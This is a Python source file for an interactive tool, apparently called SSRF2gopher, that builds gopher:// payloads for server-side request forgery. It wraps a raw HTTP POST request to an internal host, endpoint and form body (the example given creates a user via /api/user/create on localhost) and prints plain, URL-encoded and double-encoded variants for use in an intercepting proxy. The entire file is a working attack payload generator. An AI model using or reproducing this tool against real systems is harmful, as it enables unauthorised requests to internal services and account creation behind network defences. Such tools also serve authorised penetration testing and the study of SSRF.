import urllib.parse

def banner():
    banner = '''
   ___________  _______                 __          
  / __/ __/ _ \/ __/_  |___ ____  ___  / /  ___ ____
 _\ \_\ \/ , _/ _// __// _ `/ _ \/ _ \/ _ \/ -_) __/
/___/___/_/|_/_/ /____/\_, /\___/ .__/_//_/\__/_/   
                      /___/    /_/                  

Created by eMVee 
    '''
    return banner

def url_encode_payload(data):
    # Only  ' ', '=' and '&' characters
    encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
    # Replace newline characters with their URL-encoded equivalent
    encoded_data = encoded_data.replace('\n', '%0a')

    return encoded_data

def double_url_encode_payload(data):
    # Encode the ':' Double encode the ' ' from `%20` to '%2520' characters
    encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
    # Replace newline character from '%0a' to '%250a'
    encoded_data = encoded_data.replace('%0a', '%250a')

    return encoded_data


def another_option(data):
    # Encode the ':' Double encode the ' ' from `%20` to '%2520' characters
    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
    # Replace newline character from '%0a' to '%250a'
    encoded_data = encoded_data.replace('%0a', '%250a')

    return encoded_data

def host_header(host):
    host_target = "Host: " + host
    return host_target

def content_type_header():
    content_type = "Content-Type: application/x-www-form-urlencoded"
    return content_type

def calculate_content_length(data):
    # The 'len()' function in Python returns the number of elements in a string for the content length header
    content_length = "Content-Length: " + str(len(data))
    return content_length

def generate_gopher_post(host,port,endpoint):
    gopher_command = "gopher://" + host + ":" + str(port) + "/_POST " + endpoint + " HTTP/1.1"
    return gopher_command

def generate_gopher_payload():
    payload = generate_gopher_post(host,port,endpoint) + "\n"
    payload += host_header(host) + "\n"
    payload += content_type_header() + "\n"
    payload += calculate_content_length(data) + "\n"
    payload += "\n"
    payload += data
    return(payload)


print(banner())
try:
    # Example usage: localhost
    print("[?] What is the address of the Host? ")
    host = input()
    # Example usage: 80
    print("[?] What port should be used for gopher? ")
    port = input()
    # Example usage: /api/user/create
    print("[?] What endpoint should be used for gopher? ")
    endpoint = input()
    #Example usage of data to submit: username=white.rabbit&password=dontbelate
    print("[?] What data would you like to post? ")
    data = input()

    print("\n[!] Plain text payload:")
    print("\n")
    print(generate_gopher_payload())


    encoded_payload = url_encode_payload(generate_gopher_payload())
    print("\n[!] URL encoded payload:")
    print(encoded_payload)
    print("\n[!] Double URL encoded payload:")
    print(double_url_encode_payload(encoded_payload))
    print("\n[!] Another option that might work via something like BURP:")
    print(another_option(encoded_payload))

except KeyboardInterrupt:
    print("\n[!] Script interrupted by user. Exiting...")
